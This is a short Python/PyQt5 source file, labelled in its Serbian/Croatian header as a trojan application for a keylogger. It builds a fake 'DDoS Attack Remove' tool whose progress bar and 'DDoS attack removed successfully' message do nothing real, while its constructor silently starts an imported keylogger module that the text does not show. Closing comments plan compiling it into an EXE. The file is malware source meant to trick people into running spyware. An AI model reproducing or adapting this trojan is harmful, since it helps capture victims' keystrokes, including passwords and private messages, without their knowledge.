# TROJANAC APLIKACIJA ZA KEYLOGGER
import keylogger
from PyQt5.QtWidgets import (QLabel, QWidget, QProgressBar, QPushButton, QApplication, QMessageBox)
from PyQt5.QtCore import QBasicTimer
from PyQt5.QtGui import QImage, QPalette, QBrush
import sys

class CoverApplication(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
        keylogger.run() ## START KEYLOGGER

    def initUI(self):
        self.setBackground()

        #message

        self.pbar = QProgressBar(self)
        self.pbar.setGeometry(30, 40, 400, 30)
        self.pbar.move(70, 150)

        self.btn = QPushButton('Start', self)
        self.btn.move(210, 200)
        self.btn.clicked.connect(self.doAction)

        self.timer = QBasicTimer()
        self.step = 0

        self.setGeometry(100, 100, 500, 300)
        self.setWindowTitle('DDoS Attack Remove')
        self.show()

    def timerEvent(self, e):
        if self.step >= 100:
            self.timer.stop()
            self.btn.setText('Finished')
            #popup
            self.hide()
            popup = QWidget()
            popup.setWindowTitle('Done')
            popup.setGeometry(100, 100, 100, 10)

            popup.buttonReply = QMessageBox.information(self, 'Finished', "DDoS attack removed succesfully.", QMessageBox.Ok)
            if popup.buttonReply == QMessageBox.Ok:
                popup.hide()
                self.show()
                return

            popup.show()
            return

        self.step = self.step + 1
        self.pbar.setValue(self.step)

    def doAction(self):
        if self.timer.isActive():
            self.timer.stop()
            self.btn.setText('Start')
        else:
            self.timer.start(100, self)
            self.btn.setText('Stop')
            
    def setBackground(self):
        background = QImage('assets/background.jpg')
        background = background.scaled(500, 300)
        pallete = QPalette()
        pallete.setBrush(QPalette.Window, QBrush(background))
        self.setPalette(pallete)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = CoverApplication()
    sys.exit(app.exec_())

# URADI DODAVANJE PORUKE
# VIDI STA JE SA SLIKOM KADA SE KOMPAJLIRA U EXE FAJL